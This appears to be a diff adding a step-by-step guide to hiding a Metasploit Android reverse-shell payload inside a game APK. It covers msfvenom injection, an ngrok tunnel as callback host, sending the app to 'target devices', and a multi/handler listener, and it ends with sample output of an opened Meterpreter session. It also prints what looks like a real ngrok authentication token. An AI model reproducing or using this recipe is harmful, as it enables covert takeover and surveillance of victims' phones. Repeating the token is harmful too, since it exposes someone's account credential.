@@ -1,0 +1,43 @@
+Step 1: Type of payload in Android Platform
+      
+       * sudo msfvenom --list payload | grep android
+
+Step 2: Determine the LHost and LPort 
+      
+       * sudo ngrok tcp 1234  ;need to register into  ngrok.com
+                               type the following shell to get forwarding ip and 			       port
+                             * choco install ngrok
+                             * ngrok config add-authtoken 2hJD4la2KlIP9w0KPeZ3elIMXos_4s3QNR2S6z4gJcBH9eAPs  (authentication token for default ngrok.yml configuration file)
+
+Step 3: Malicious injecting in a Medium. Here a Game is used for this purpose
+ 
+      *  sudo msfvenom --platform android -x ~/Desktop/Hack/googledoogle.apk -p android/meterpreter/reverse_tcp LHOST=0.tcp.in.ngrok.io LPORT=18158 -o  ~/Desktop/Hack/google_hack.apk
+
+Step 4: Send the Malicious program to target devices
+
+Step 5: msfconsole -q ( in 2nd Terminal)
+
+Step 6: use exploit/multi/handler
+
+Step 7: set payload android/meterpreter/reverse_tcp
+
+Step 8: set LHOST 0.0.0.0 or localhsot
+        set LPORT 1234 (from negrok)
+
+Step 9: show options
+
+Step 10: run
+
+Step 11: Once the app is running, we get reverse_tcp response
+
+[*] Started reverse handler on <ip><port>
+[*] Starting the payload handler...
+[*] Sending stage (770048 bytes) to 192.168.1.13 (hacker ip @ Background)
+[*] Meterpreter session 1 opened (192.168.1.25:4444 (Source ip and port) -> 192.168.1.13:1138) at 2017-12-20
+10:03:43 -0500
+
+Step 12: help (command to see the possible actions/tool be used over the target     	       device.)
+
+
+                           
+    
